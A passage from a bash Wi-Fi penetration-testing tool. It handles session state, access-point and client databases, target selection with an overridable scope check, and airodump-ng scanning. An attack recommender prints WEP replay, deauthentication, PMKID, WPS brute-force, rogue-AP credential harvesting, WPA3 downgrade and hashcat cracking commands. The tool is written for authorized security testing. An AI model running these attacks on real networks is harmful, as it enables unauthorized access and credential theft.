        printf 'LAST_IFACE="%s"\n'            "$LAST_IFACE"
        printf 'SELECTED_BAND="%s"\n'         "$SELECTED_BAND"
        printf 'GLOBAL_IFACE="%s"\n'          "$GLOBAL_IFACE"
        printf 'MAC_SPOOF_ENABLED="%s"\n'     "$MAC_SPOOF_ENABLED"
        printf 'MAC_SPOOF_MODE="%s"\n'        "$MAC_SPOOF_MODE"
        printf 'MAC_SPOOF_ADDR="%s"\n'        "$MAC_SPOOF_ADDR"
        printf 'TX_POWER_DBM="%s"\n'          "$TX_POWER_DBM"
        printf 'ACTIVE_PROFILE="%s"\n'        "$ACTIVE_PROFILE"
        printf 'SCOPE_ENFORCED="%s"\n'        "$SCOPE_ENFORCED"
    } > "$SESSION_FILE"
    chmod 600 "$SESSION_FILE"
    audit_log "SESSION SAVED: target='$TARGET_SSID' bssid=$TARGET_BSSID"
}

load_session() {
    [[ -f "$SESSION_FILE" ]] || return 1
    # shellcheck source=/dev/null
    source "$SESSION_FILE"
    audit_log "SESSION LOADED: target='$TARGET_SSID' bssid=$TARGET_BSSID"
}

offer_load_session() {
    [[ ! -f "$SESSION_FILE" ]] && return
    local saved_target
    saved_target=$(grep '^TARGET_SSID=' "$SESSION_FILE" 2>/dev/null | cut -d'"' -f2)
    [[ -z "$saved_target" ]] && return
    local saved_bssid
    saved_bssid=$(grep '^TARGET_BSSID=' "$SESSION_FILE" 2>/dev/null | cut -d'"' -f2)
    local saved_enc
    saved_enc=$(grep '^TARGET_ENC=' "$SESSION_FILE" 2>/dev/null | cut -d'"' -f2)

    dialog --title " Previous Session Found " \
           --yesno "\n  Previous engagement target:\n\n  SSID     : $saved_target\n  BSSID    : $saved_bssid\n  Security : $saved_enc\n\n  Resume this session?" \
           13 54
    if [[ $? -eq 0 ]]; then
        load_session
        dialog --title " Session Resumed " \
               --infobox "\n  [OK]  Target: $TARGET_SSID\n  BSSID : $TARGET_BSSID  CH:$TARGET_CHANNEL" \
               7 60
        sleep 1
    fi
}

# ────────────────────────────────────────────────────────────
#  AP & CLIENT DATABASE  — persistent TSV files in OUTPUT_DIR
# ────────────────────────────────────────────────────────────
ap_db_init() {
    if [[ ! -f "$AP_DB" ]]; then
        printf '#BSSID\tSSID\tChannel\tBand\tSecurity\tAuth\tPower\tLastSeen\tMFP\tFingerprint\n' > "$AP_DB"
        chmod 600 "$AP_DB"
    elif ! head -1 "$AP_DB" | grep -q 'Band'; then
        # Migration 1: insert Band column after Channel
        local tmpf="${TMPDIR_PT}/ap_db_migrate_$$"
        {
            printf '#BSSID\tSSID\tChannel\tBand\tSecurity\tAuth\tPower\tLastSeen\tMFP\tFingerprint\n'
            grep -v '^#' "$AP_DB" | awk -F'\t' -v OFS='\t' '{
                ch=$3+0
                band=(ch>=36) ? "5GHz" : "2.4GHz"
                print $1,$2,$3,band,$4,$5,$6,$7,"",""
            }'
        } > "$tmpf" && mv "$tmpf" "$AP_DB" && chmod 600 "$AP_DB"
    elif ! head -1 "$AP_DB" | grep -q 'MFP'; then
        # Migration 2: add MFP and Fingerprint columns to existing 8-column DB
        local tmpf="${TMPDIR_PT}/ap_db_migrate2_$$"
        {
            printf '#BSSID\tSSID\tChannel\tBand\tSecurity\tAuth\tPower\tLastSeen\tMFP\tFingerprint\n'
            grep -v '^#' "$AP_DB" | awk -F'\t' -v OFS='\t' '{print $0,"",""}'
        } > "$tmpf" && mv "$tmpf" "$AP_DB" && chmod 600 "$AP_DB"
    fi
    if [[ ! -f "$CLIENT_DB" ]]; then
        printf '#ClientMAC\tBSSID\tSSID\tPower\tLastSeen\tProbed\n' > "$CLIENT_DB"
        chmod 600 "$CLIENT_DB"
    fi
}

ap_db_upsert() {
    local bssid="$1" ssid="$2" ch="$3" enc="$4" auth="$5" pwr="$6"
    local mfp="${7:-}" fp="${8:-}"
    [[ -z "$bssid" || -z "$AP_DB" ]] && return
    local ts; ts=$(date '+%Y-%m-%d %H:%M:%S')
    local band="2.4GHz"
    [[ "${ch//[^0-9]/}" -ge 36 ]] 2>/dev/null && band="5GHz"
    # Preserve existing MFP/Fingerprint if not provided
    if [[ -z "$mfp" || -z "$fp" ]]; then
        local existing_line; existing_line=$(grep -v '^#' "$AP_DB" 2>/dev/null | grep "^${bssid}	" | head -1)
        if [[ -n "$existing_line" ]]; then
            [[ -z "$mfp" ]] && mfp=$(echo "$existing_line" | awk -F'\t' '{print $9}')
            [[ -z "$fp"  ]] && fp=$(echo "$existing_line"  | awk -F'\t' '{print $10}')
        fi
    fi
    local new_line; printf -v new_line '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s' \
        "$bssid" "$ssid" "$ch" "$band" "$enc" "$auth" "$pwr" "$ts" "${mfp:-}" "${fp:-}"
    local tmpf="${TMPDIR_PT}/ap_db_tmp_$$"
    {
        grep '^#' "$AP_DB" 2>/dev/null | head -1
        grep -v '^#' "$AP_DB" 2>/dev/null | grep -v "^${bssid}	" || true
        printf '%s\n' "$new_line"
    } > "$tmpf" && mv "$tmpf" "$AP_DB" && chmod 600 "$AP_DB"
}

client_db_upsert() {
    local mac="$1" assoc_bssid="$2" assoc_ssid="$3" pwr="$4" probed="$5"
    [[ -z "$mac" || -z "$CLIENT_DB" ]] && return
    local ts; ts=$(date '+%Y-%m-%d %H:%M:%S')
    local new_line; printf -v new_line '%s\t%s\t%s\t%s\t%s\t%s' \
        "$mac" "$assoc_bssid" "$assoc_ssid" "$pwr" "$ts" "$probed"
    local tmpf="${TMPDIR_PT}/cli_db_tmp_$$"
    {
        grep '^#' "$CLIENT_DB" 2>/dev/null | head -1
        grep -v '^#' "$CLIENT_DB" 2>/dev/null | grep -v "^${mac}	" || true
        printf '%s\n' "$new_line"
    } > "$tmpf" && mv "$tmpf" "$CLIENT_DB" && chmod 600 "$CLIENT_DB"
}

# ────────────────────────────────────────────────────────────
#  ATTACK RECOMMENDER  — driven by Privacy + Auth fields
# ────────────────────────────────────────────────────────────
recommend_attacks() {
    local enc="${1^^}"   # Privacy field: WPA2, WPA3, WEP, OPN …
    local auth="${2^^}"  # Auth field:    PSK, MGT, SAE, (blank)

    if [[ "$enc" == "OPN" || -z "$enc" ]]; then
        echo "  [1] Captive Portal Attack    — EAPHammer open AP, harvest creds"
        echo "  [2] Passive Traffic Capture  — no encryption, sniff with tcpdump/wireshark"
    elif [[ "$enc" == *"WEP"* ]]; then
        echo "  [1] WEP Cracking (aircrack-ng):"
        echo "      aireplay-ng -3 -b <BSSID> <MON> && aircrack-ng capture.cap"
    elif [[ "$auth" == *"MGT"* || "$enc" == *"MGT"* ]]; then
        echo "  [1] Enterprise EAP Harvest   — EAPHammer rogue WPA2-Enterprise AP"
        echo "      --negotiate balanced --creds  (captures MSCHAPv2 hashes)"
        echo "  [2] Crack MSCHAPv2 offline:"
        echo "      hashcat -m 5600 eap_creds.log /usr/share/wordlists/rockyou.txt"
    elif [[ "$enc" == *"WPA3"* && "$enc" == *"WPA2"* ]]; then
        echo "  [1] WPA3 → WPA2 Downgrade    — EAPHammer rogue WPA2 AP (SAE → PSK)"
        echo "  [2] PMKID Clientless Capture — works on WPA2 leg of transition mode"
        echo "  [3] WPA2 Handshake Capture   — deauth active clients, capture 4-way HS"
        echo "  Crack: hashcat -m 22000 hashes.hc22000 rockyou.txt"
    elif [[ "$enc" == *"WPA3"* ]]; then
        echo "  [1] WPA3 → WPA2 Downgrade    — EAPHammer (works if clients accept WPA2)"
        echo "  [!] Pure WPA3-SAE resists PMKID attacks and traditional handshake capture"
    else
        # WPA / WPA2 PSK (most common scenario)
        echo "  [1] PMKID Clientless Capture — best first: no client deauth required"
        echo "      hcxdumptool → hcxpcapngtool → hashcat -m 22000"
        echo "  [2] WPA2 Handshake Capture   — deauth + airodump-ng capture 4-way HS"
        echo "  [3] WPS Attack (if WPS enabled): Pixie Dust first → PIN brute-force"
        echo "  Crack: hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt"
        echo "  Mask : hashcat -m 22000 hashes.hc22000 -a 3 ?u?l?l?l?d?d?d?d"
    fi
}

# ────────────────────────────────────────────────────────────
#  TARGET MANAGEMENT
# ────────────────────────────────────────────────────────────
require_target() {
    if [[ -z "$TARGET_BSSID" ]]; then
        dialog --title " No Target Selected " \
               --yesno "\n  No target AP is set.\n\n  Scan for access points first,\n  or enter details manually?" \
               10 52
        if [[ $? -eq 0 ]]; then
            manual_target_entry || return 1
        else
            return 1
        fi
    fi
    # Scope enforcement check
    if [[ "${SCOPE_ENFORCED:-1}" -eq 1 && -n "${SCOPE_FILE:-}" && -s "${SCOPE_FILE:-}" ]]; then
        if ! scope_check "$TARGET_BSSID" "$TARGET_SSID"; then
            dialog --title " Out-of-Scope Target " \
                   --yesno "\n  WARNING: Target is NOT in scope file.\n\n  BSSID : $TARGET_BSSID\n  SSID  : $TARGET_SSID\n  Scope : $SCOPE_FILE\n\n  Proceeding without written authorization may\n  constitute unauthorized access.\n\n  Override scope restriction and continue anyway?" \
                   16 60
            [[ $? -ne 0 ]] && return 1
            audit_log "SCOPE OVERRIDE: bssid=$TARGET_BSSID ssid=$TARGET_SSID — consultant confirmed override"
        fi
    fi
}

manual_target_entry() {
    # BSSID — validate format XX:XX:XX:XX:XX:XX
    while true; do
        TARGET_BSSID=$(dialog --title " Manual Target — BSSID " \
            --inputbox "\n  Enter BSSID  (e.g. AA:BB:CC:DD:EE:FF):" \
            9 58 "$TARGET_BSSID" 3>&1 1>&2 2>&3) || return 1
        if validate_bssid "$TARGET_BSSID"; then
            TARGET_BSSID="${TARGET_BSSID^^}"   # normalize to uppercase
            break
        fi
        dialog --title " Invalid BSSID " \
               --msgbox "\n  '$TARGET_BSSID' is not a valid MAC address.\n\n  Format: AA:BB:CC:DD:EE:FF  (hex octets, colon-separated)" \
               9 58
    done

    # SSID — 1-32 bytes
    while true; do
        TARGET_SSID=$(dialog --title " Manual Target — SSID " \
            --inputbox "\n  Enter SSID  (max 32 characters):" \
            9 58 "$TARGET_SSID" 3>&1 1>&2 2>&3) || return 1
        if validate_ssid "$TARGET_SSID"; then break; fi
        dialog --title " Invalid SSID " \
               --msgbox "\n  SSID must be 1-32 characters.\n  Got ${#TARGET_SSID} characters." \
               8 52
    done

    # Channel — 2.4 GHz or 5 GHz
    while true; do
        TARGET_CHANNEL=$(dialog --title " Manual Target — Channel " \
            --inputbox "\n  Enter channel  (1-14 for 2.4 GHz / 36-165 for 5 GHz):" \
            9 58 "$TARGET_CHANNEL" 3>&1 1>&2 2>&3) || return 1
        if validate_channel "$TARGET_CHANNEL"; then break; fi
        dialog --title " Invalid Channel " \
               --msgbox "\n  '$TARGET_CHANNEL' is not a valid channel.\n\n  Valid ranges: 1-14 (2.4 GHz)  or  36-165 (5 GHz)" \
               9 56
    done

    TARGET_ENC=$(dialog --title " Manual Target — Encryption " \
        --inputbox "\n  Enter encryption  (WPA2 / WPA3 / WEP / OPN):" \
        9 58 "$TARGET_ENC" 3>&1 1>&2 2>&3) || return 1
    TARGET_AUTH=""   # unknown when manually entered

    # Show attack recommendations based on the entered security type
    local recs; recs=$(recommend_attacks "$TARGET_ENC" "")
    dialog --title " Target Set: $TARGET_SSID " \
           --msgbox "\
\n  SSID     : $TARGET_SSID\
\n  BSSID    : $TARGET_BSSID\
\n  Channel  : $TARGET_CHANNEL\
\n  Security : $TARGET_ENC\
\n\
\n  Recommended Attacks:\
\n${recs}" \
           22 68

    save_session
    audit_log "TARGET MANUAL: ssid='$TARGET_SSID' bssid=$TARGET_BSSID ch=$TARGET_CHANNEL enc=$TARGET_ENC"
}

make_outdir() {
    local suffix="${1:-}"
    local safe_ssid="${TARGET_SSID//[^a-zA-Z0-9_-]/_}"
    local ts; ts=$(date +%Y%m%d_%H%M%S)
    # Segregate captures by band so 2.4 GHz and 5 GHz results never mix
    local band_dir
    case "${SELECTED_BAND:-2.4}" in
        "5")    band_dir="5GHz"  ;;
        "dual") band_dir="dual"  ;;
        *)      band_dir="2.4GHz" ;;
    esac
    local dir="${OUTPUT_DIR}/${band_dir}/${safe_ssid}${suffix:+_${suffix}}_${ts}"
    mkdir -p "$dir"
    echo "$dir"
}

# Helper: human-readable band label used in dialogs / status lines
band_label() {
    case "${SELECTED_BAND:-2.4}" in
        "5")    echo "5 GHz"       ;;
        "dual") echo "2.4 + 5 GHz" ;;
        *)      echo "2.4 GHz"     ;;
    esac
}

# Helper: airodump-ng --band argument matching SELECTED_BAND
band_airodump_flag() {
    case "${SELECTED_BAND:-2.4}" in
        "5")    echo "a"   ;;   # 802.11a — 5 GHz channels only
        "dual") echo "abg" ;;   # 802.11a/b/g — all channels
        *)      echo "bg"  ;;   # 802.11b/g — 2.4 GHz channels only
    esac
}

# Helper: comma-separated channel list for the active band
# Used by hcxdumptool and targeted captures that need explicit channels
band_channels() {
    case "${SELECTED_BAND:-2.4}" in
        "5")
            echo "36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165"
            ;;
        "dual")
            echo "1,2,3,4,5,6,7,8,9,10,11,12,13,14,36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165"
            ;;
        *)
            echo "1,2,3,4,5,6,7,8,9,10,11,12,13,14"
            ;;
    esac
}

# ────────────────────────────────────────────────────────────
#  SPAWN TAB  — create a named tmux window for an attack task
# ────────────────────────────────────────────────────────────
save_tab_env() {
    local env_file="$1"
    cat > "$env_file" << ENVEOF
TARGET_BSSID="${TARGET_BSSID}"
TARGET_SSID="${TARGET_SSID}"
TARGET_CHANNEL="${TARGET_CHANNEL}"
TARGET_ENC="${TARGET_ENC}"
TARGET_AUTH="${TARGET_AUTH}"
SELECTED_IFACE="${SELECTED_IFACE}"
EAPHAMMER="${EAPHAMMER}"
OUTPUT_DIR="${OUTPUT_DIR}"
TMPDIR_PT="${TMPDIR_PT}"
SCRIPT_DIR="${SCRIPT_DIR}"
ENTERPRISE_CONF="${ENTERPRISE_CONF}"
EAP_ACTIVE_CERT="${EAP_ACTIVE_CERT}"
VENV_DIR="${VENV_DIR}"
VENV_PYTHON="${VENV_PYTHON}"
AUDIT_LOG="${AUDIT_LOG}"
SESSION_START="${SESSION_START}"
SESSION_FILE="${SESSION_FILE}"
AP_DB="${AP_DB}"
CLIENT_DB="${CLIENT_DB}"
TARGET_CLIENT_COUNT="${TARGET_CLIENT_COUNT}"
TARGET_VENDOR="${TARGET_VENDOR}"
LAST_IFACE="${LAST_IFACE}"
SELECTED_BAND="${SELECTED_BAND}"
GLOBAL_IFACE="${GLOBAL_IFACE}"
TAB_TIMEOUT="${TAB_TIMEOUT}"
TAB_ROGUE_PSK="${TAB_ROGUE_PSK}"
TAB_NEGOTIATE="${TAB_NEGOTIATE}"
TAB_WPA_VER="${TAB_WPA_VER}"
TAB_CAP_HS="${TAB_CAP_HS}"
TAB_PHASE1="${TAB_PHASE1}"
TAB_PHASE2="${TAB_PHASE2}"
TAB_DEAUTH_COUNT="${TAB_DEAUTH_COUNT}"
TAB_DEAUTH_CLIENT="${TAB_DEAUTH_CLIENT}"
TAB_PROBE_DUR="${TAB_PROBE_DUR}"
TAB_PORTAL_SSID="${TAB_PORTAL_SSID}"
TAB_PORTAL_CHANNEL="${TAB_PORTAL_CHANNEL}"
TAB_WPS_METHOD="${TAB_WPS_METHOD}"
TAB_WPS_PIN="${TAB_WPS_PIN}"
TAB_MITM_GW="${TAB_MITM_GW}"
TAB_MITM_TARGETS="${TAB_MITM_TARGETS}"
TAB_MITM_DNS="${TAB_MITM_DNS}"
TAB_MITM_SSL="${TAB_MITM_SSL}"
TAB_HC_FILE="${TAB_HC_FILE}"
TAB_HC_HASH_TYPE="${TAB_HC_HASH_TYPE}"
TAB_HC_WORDLIST="${TAB_HC_WORDLIST}"
TAB_HC_MODE="${TAB_HC_MODE}"
MAC_SPOOF_ENABLED="${MAC_SPOOF_ENABLED}"
MAC_SPOOF_MODE="${MAC_SPOOF_MODE}"
MAC_SPOOF_ADDR="${MAC_SPOOF_ADDR}"
TX_POWER_DBM="${TX_POWER_DBM}"
SCOPE_FILE="${SCOPE_FILE}"
SCOPE_ENFORCED="${SCOPE_ENFORCED}"
ACTIVE_PROFILE="${ACTIVE_PROFILE}"
PROFILES_DIR="${PROFILES_DIR}"
TAB_PSK_VERIFY_SSID="${TAB_PSK_VERIFY_SSID}"
TAB_PSK_VERIFY_BSSID="${TAB_PSK_VERIFY_BSSID}"
TAB_PSK_VERIFY_PSK="${TAB_PSK_VERIFY_PSK}"
TAB_PSK_VERIFY_IFACE="${TAB_PSK_VERIFY_IFACE}"
TAB_HIDDEN_MON_IFACE="${TAB_HIDDEN_MON_IFACE}"
TAB_HIDDEN_TARGET_BSSID="${TAB_HIDDEN_TARGET_BSSID}"
TAB_WL_TARGET_SSID="${TAB_WL_TARGET_SSID}"
TAB_WL_COMPANY="${TAB_WL_COMPANY}"
TAB_WL_URL="${TAB_WL_URL}"
TAB_WL_FILE="${TAB_WL_FILE}"
TAB_WEP_METHOD="${TAB_WEP_METHOD}"
TAB_WEP_IV_THRESHOLD="${TAB_WEP_IV_THRESHOLD}"
TAB_KARMA_MODE="${TAB_KARMA_MODE}"
TAB_KARMA_SSIDS="${TAB_KARMA_SSIDS}"
TAB_KARMA_CHANNEL="${TAB_KARMA_CHANNEL}"
TAB_KARMA_PSK="${TAB_KARMA_PSK}"
HOSTAPD_WPE="${HOSTAPD_WPE}"
TAB_AUTO_MODE="${TAB_AUTO_MODE}"
TAB_AUTO_TIMEOUT_PMKID="${TAB_AUTO_TIMEOUT_PMKID}"
TAB_AUTO_TIMEOUT_HS="${TAB_AUTO_TIMEOUT_HS}"
TAB_AUTO_WORDLIST="${TAB_AUTO_WORDLIST}"
TAB_AUTO_CRACK_MODE="${TAB_AUTO_CRACK_MODE}"
ENVEOF
}

spawn_tab() {
    local tab_name="$1"
    local task_func="$2"

    if [[ $TMUX_AVAILABLE -ne 1 ]]; then
        dialog --title " Tabs Unavailable " \
               --msgbox "\n  tmux is not available or not running.\n  Launch the script inside tmux for tab support.\n\n  Tip: run  tmux  then re-launch this script." \
               10 58
        return 1
    fi

    local env_file="${TMPDIR_PT}/env_${tab_name//[^a-zA-Z0-9]/_}_$$.sh"
    save_tab_env "$env_file"

    # Create new named tmux window; run this script in --tab mode
    tmux new-window -n "$tab_name" \
        "bash '${BASH_SOURCE[0]}' --tab '${task_func}' '${env_file}'; \
         printf '\n${AM}${BD}  [Task complete — Ctrl+b 0 returns to Main]${NC}\n'; \
         read -rp '  Press Enter to close this tab... '"

    # Track by window name (tmux index shifts so use name)
    local win_idx
    win_idx=$(tmux list-windows -F "#{window_index}:#{window_name}" 2>/dev/null \
              | grep ":${tab_name}$" | tail -1 | cut -d: -f1)
    RUNNING_TASKS["win_${win_idx:-?}"]="${tab_name}|${env_file}|tmux:${win_idx:-?}"

    # Flash a notification in the status bar and refocus main window
    tmux display-message "Tab '${tab_name}' started — Ctrl+b $(tmux list-windows | wc -l | tr -d ' ') or Ctrl+b n"
}

notify_tab_launched() {
    local tab_name="$1"
    local win_num
    win_num=$(tmux list-windows -F "#{window_index}:#{window_name}" 2>/dev/null \
              | grep ":${tab_name}$" | tail -1 | cut -d: -f1)
    dialog --title " Task Tab Launched " \
           --infobox "\n  Tab '${tab_name}' is now running.\n\n  Switch to it:   Ctrl+b ${win_num:-n}\n  Next tab:       Ctrl+b n\n  Prev tab:       Ctrl+b p\n  List all tabs:  Ctrl+b w" \
           11 52
    sleep 2
}

# ────────────────────────────────────────────────────────────
#  AP SCAN
# ────────────────────────────────────────────────────────────
scan_aps() {
    draw_banner
    local iface
    iface=$(pick_interface "Select interface for AP scan:") || return

    dialog --title " Monitor Mode " \
           --infobox "\n  Enabling monitor mode on $iface ..." 6 48
    sleep 1
    local mon; mon=$(put_in_monitor "$iface") || return 1

    local scan_prefix="${TMPDIR_PT}/scan"
    local scan_time=20
    local bd_flag; bd_flag=$(band_airodump_flag)
    local bd_lbl;  bd_lbl=$(band_label)

    # ── Check if airodump-ng supports --band flag (requires aircrack-ng >= 1.6) ──
    local use_band_flag=1
    if ! airodump-ng --help 2>&1 | grep -q -- '--band'; then
        use_band_flag=0
        dialog --title " Compatibility Notice " \
               --msgbox "\
\n  Your version of airodump-ng does not support the --band flag.\
\n  (Requires aircrack-ng >= 1.6)\
\n\
\n  Scan will run without band filter — all channels will be\
\n  scanned regardless of the selected band setting.\
\n\
\n  Upgrade: sudo apt update && sudo apt install aircrack-ng" \
               12 64
    fi

    if [[ $use_band_flag -eq 1 ]]; then
        airodump-ng --output-format csv --write-interval 1 \
                    --band "$bd_flag" \
                    -w "$scan_prefix" "$mon" &>/dev/null &
    else
        airodump-ng --output-format csv --write-interval 1 \
                    -w "$scan_prefix" "$mon" &>/dev/null &
    fi
    local airodump_pid=$!

    for i in $(seq 1 "$scan_time"); do
        echo $(( (i * 100) / scan_time ))
        sleep 1
    done | dialog --title " Scanning for Access Points " \
                  --gauge "\n  Interface : $mon\n  Band      : $bd_lbl\n  Duration  : ${scan_time}s\n\n  Listening for beacon frames and probes ..." \
                  12 62 0

    kill "$airodump_pid" 2>/dev/null || true
    sleep 1

    local csv="${scan_prefix}-01.csv"
    if [[ ! -f "$csv" ]]; then
        dialog --title " Scan Error " \
               --msgbox "\n  No scan data captured.\n  Verify monitor mode is working on $mon." 8 52
        restore_single_interface "$mon"
        return 1
    fi

    # ── Parse AP section (lines before the blank line) ─────────
    # Use awk to handle SSIDs that contain commas (airodump wraps them in quotes).
    # Field layout: BSSID(1), firsttime(2), lasttime(3), channel(4), speed(5),
    #   privacy(6), cipher(7), auth(8), power(9), beacons(10), iv(11),
    #   lanip(12), idlength(13), ESSID(14), key(15)
    # For SSIDs with commas the ESSID column spans multiple positional fields —
    # so we extract it as everything between the 14th comma and the LAST comma.
    local -a ap_bssids ap_channels ap_privacies ap_essids ap_powers ap_auths
    local in_ap=1
    while IFS= read -r raw_line; do
        [[ -z "${raw_line// /}" ]] && { in_ap=0; continue; }
        [[ $in_ap -eq 0 ]] && continue
        # Strip leading/trailing whitespace
        raw_line="${raw_line#"${raw_line%%[! ]*}"}"
        [[ "$raw_line" =~ ^BSSID|^Station|^Network ]] && continue
        # Extract fixed-position fields (1-9) via positional IFS split
        IFS=',' read -r bssid _ft _lt channel _speed privacy _cipher auth power _rest \
            <<< "$raw_line"
        bssid="${bssid// /}"
        [[ -z "$bssid" || ${#bssid} -lt 17 ]] && continue
        # Extract ESSID: everything from field 14 to second-to-last comma
        # (field 15 is the key, always empty in airodump output)
        local essid
        essid=$(awk -F',' '{ n=split($0,a,","); e=""; for(i=14;i<=n-1;i++) e=e (i>14?",":"") a[i]; gsub(/^ +| +$/, "", e); print e }' <<< "$raw_line")
        channel="${channel// /}"
        privacy="${privacy// /}"
        auth="${auth// /}"
        power="${power// /}"
        ap_bssids+=("$bssid")
        ap_channels+=("$channel")
        ap_privacies+=("$privacy")
        ap_auths+=("$auth")
        ap_essids+=("${essid:-<hidden>}")
        ap_powers+=("${power:-?}")
    done < "$csv"

    # ── Parse Station/Client section (lines after "Station MAC") ─
    local -a cli_macs cli_bssids cli_powers cli_probed
    local probed
    while IFS=',' read -r mac _ft _lt pwr _pkts assoc_bssid probed_rest; do
        mac="${mac// /}"
        assoc_bssid="${assoc_bssid// /}"
        [[ ${#mac} -lt 17 ]] && continue
        pwr="${pwr// /}"
        probed="${probed_rest%%,*}"
        probed="${probed// /}"
        cli_macs+=("$mac")
        cli_bssids+=("$assoc_bssid")
        cli_powers+=("$pwr")
        cli_probed+=("$probed")
    done < <(awk '/^Station MAC,/{found=1; next} found{print}' "$csv" 2>/dev/null)

    # ── Count clients per AP BSSID ──────────────────────────────
    local -A ap_client_count
    local b
    for i in "${!cli_bssids[@]}"; do
        b="${cli_bssids[$i]}"
        [[ -n "$b" && "$b" != "-1" ]] && \
            ap_client_count["$b"]=$(( ${ap_client_count[$b]:-0} + 1 ))
    done

    # ── Update persistent databases ─────────────────────────────
    if [[ -n "$AP_DB" ]]; then
        for i in "${!ap_bssids[@]}"; do
            local mfp_val fp_val
            mfp_val=$(detect_mfp "${ap_bssids[$i]}" "$csv")
            fp_val=$(fingerprint_ap "${ap_bssids[$i]}" "$csv")
            ap_db_upsert "${ap_bssids[$i]}" "${ap_essids[$i]}" \
                         "${ap_channels[$i]}" "${ap_privacies[$i]}" \
                         "${ap_auths[$i]}"    "${ap_powers[$i]}" \
                         "$mfp_val" "$fp_val"
        done
        local assoc_ssid
        for i in "${!cli_macs[@]}"; do
            assoc_ssid=""
            for j in "${!ap_bssids[@]}"; do
                [[ "${ap_bssids[$j]}" == "${cli_bssids[$i]}" ]] && \
                    assoc_ssid="${ap_essids[$j]}" && break
            done
            client_db_upsert "${cli_macs[$i]}" "${cli_bssids[$i]}" \
                             "$assoc_ssid" "${cli_powers[$i]}" "${cli_probed[$i]}"
        done
        # Passive probe capture: extract client probe history from scan CSV
        if command -v tshark &>/dev/null && [[ -f "${scan_prefix}-01.cap" ]]; then
            while IFS=$'\t' read -r probe_mac probe_ssid; do
                [[ -z "$probe_mac" || ${#probe_mac} -lt 17 ]] && continue
                [[ -z "$probe_ssid" ]] && continue
                client_db_upsert "$probe_mac" "" "" "" "$probe_ssid"
            done < <(tshark -r "${scan_prefix}-01.cap" -Y "wlan.fc.type_subtype==4" \
                            -T fields -e wlan.sa -e wlan.ssid 2>/dev/null | \
                     awk -F'\t' '{if($1 && $2) print $1"\t"$2}' | sort -u)
        fi
        audit_log "SCAN COMPLETE: ${#ap_bssids[@]} APs, ${#cli_macs[@]} clients — band=$(band_label) — databases updated"
    fi

    if [[ ${#ap_bssids[@]} -eq 0 ]]; then
        dialog --title " No APs Found " \
               --msgbox "\n  No access points detected.\n  Try moving closer or increasing scan time." 8 52
        restore_single_interface "$mon"
        return 1
    fi

    # ── Build AP selection menu (client count + OUI vendor) ─────
    local menu_items=()
    local label cli_n vendor
    for i in "${!ap_bssids[@]}"; do
        cli_n="${ap_client_count[${ap_bssids[$i]}]:-0}"
        vendor=$(oui_lookup "${ap_bssids[$i]}")
        printf -v label "%-18s %-17s CH:%-3s %-5s %sdBm [%d] %-10s" \
            "${ap_essids[$i]:0:18}" "${ap_bssids[$i]}" \
            "${ap_channels[$i]}"    "${ap_privacies[$i]:0:5}" \
            "${ap_powers[$i]}"      "$cli_n" "${vendor:0:10}"
        menu_items+=("$i" "$label")
    done

    local idx
    idx=$(dialog \
        --title " Access Points — ${#ap_bssids[@]} found  |  ${#cli_macs[@]} clients seen " \
        --menu "\n  SSID               BSSID             CH  ENC   PWR   [C] Vendor\n  ──────────────────────────────────────────────────────────────────" \
        24 84 12 \
        "${menu_items[@]}" \
        3>&1 1>&2 2>&3) || {
        restore_single_interface "$mon"
        return
    }

    # ── Set target globals ──────────────────────────────────────
    TARGET_BSSID="${ap_bssids[$idx]}"
    TARGET_SSID="${ap_essids[$idx]}"
    TARGET_CHANNEL="${ap_channels[$idx]}"
    TARGET_ENC="${ap_privacies[$idx]}"
    TARGET_AUTH="${ap_auths[$idx]}"
    TARGET_CLIENT_COUNT="${ap_client_count[$TARGET_BSSID]:-0}"
    TARGET_VENDOR=$(oui_lookup "$TARGET_BSSID")

    # ── Save scan CSV ────────────────────────────────────────────
    local out_dir; out_dir=$(make_outdir "scan")
    cp "$csv" "${out_dir}/scan.csv"

    # ── Build connected client list for this AP ──────────────────
    local cli_detail=""
    for i in "${!cli_macs[@]}"; do
        [[ "${cli_bssids[$i]}" != "$TARGET_BSSID" ]] && continue
        cli_detail+="    ${cli_macs[$i]}  pwr:${cli_powers[$i]}dBm"
        [[ -n "${cli_probed[$i]}" ]] && cli_detail+="  probing:[${cli_probed[$i]}]"
        cli_detail+=$'\n'
    done
    [[ -z "$cli_detail" ]] && \
        cli_detail="    (no clients seen — PMKID attack does not need clients)"$'\n'

    # ── Show target info + clients + attack recommendations ──────
    local recs; recs=$(recommend_attacks "$TARGET_ENC" "$TARGET_AUTH")
    local tgt_band="2.4 GHz"
    [[ "${TARGET_CHANNEL//[^0-9]/}" -ge 36 ]] 2>/dev/null && tgt_band="5 GHz"
    dialog --title " Target: $TARGET_SSID " \
           --msgbox "\
\n  SSID     : $TARGET_SSID\
\n  BSSID    : $TARGET_BSSID\
\n  Channel  : $TARGET_CHANNEL  (${tgt_band})\
\n  Security : $TARGET_ENC  (Auth: $TARGET_AUTH)\
\n\
\n  Connected Clients (${ap_client_count[$TARGET_BSSID]:-0}):\
\n${cli_detail}\
\n  Recommended Attacks:\
\n${recs}\
\n\
\n  Scan saved: ${out_dir}/scan.csv" \
           28 76

    save_session
    audit_log "TARGET SET: ssid='$TARGET_SSID' bssid=$TARGET_BSSID ch=$TARGET_CHANNEL enc=$TARGET_ENC auth=$TARGET_AUTH"

    # Offer hidden SSID discovery if any hidden APs were found
    local hidden_count=0
    for essid_chk in "${ap_essids[@]}"; do
        [[ "$essid_chk" == "<hidden>" || "$essid_chk" == \<length:* ]] && \
            (( hidden_count++ )) || true
    done
    if [[ $hidden_count -gt 0 ]]; then
        dialog --title " Hidden SSIDs Detected " \
               --yesno "\n  Found ${hidden_count} hidden SSID(s) in this scan.\n\n  Probe for hidden SSIDs now?\n  (Passive analysis of captured frames)" \
               10 54
        if [[ $? -eq 0 ]]; then
            TAB_HIDDEN_TARGET_BSSID="$TARGET_BSSID"
            discover_hidden_ssids "$csv"
        fi
    fi

    dialog --title " Interface " \
           --yesno "\n  Keep $mon in monitor mode for next attack?" 8 48
    [[ $? -ne 0 ]] && restore_single_interface "$mon"
}

# ────────────────────────────────────────────────────────────
#  HASHCAT CONVERSION
# ────────────────────────────────────────────────────────────
convert_to_hashcat() {
    local input_file="$1"
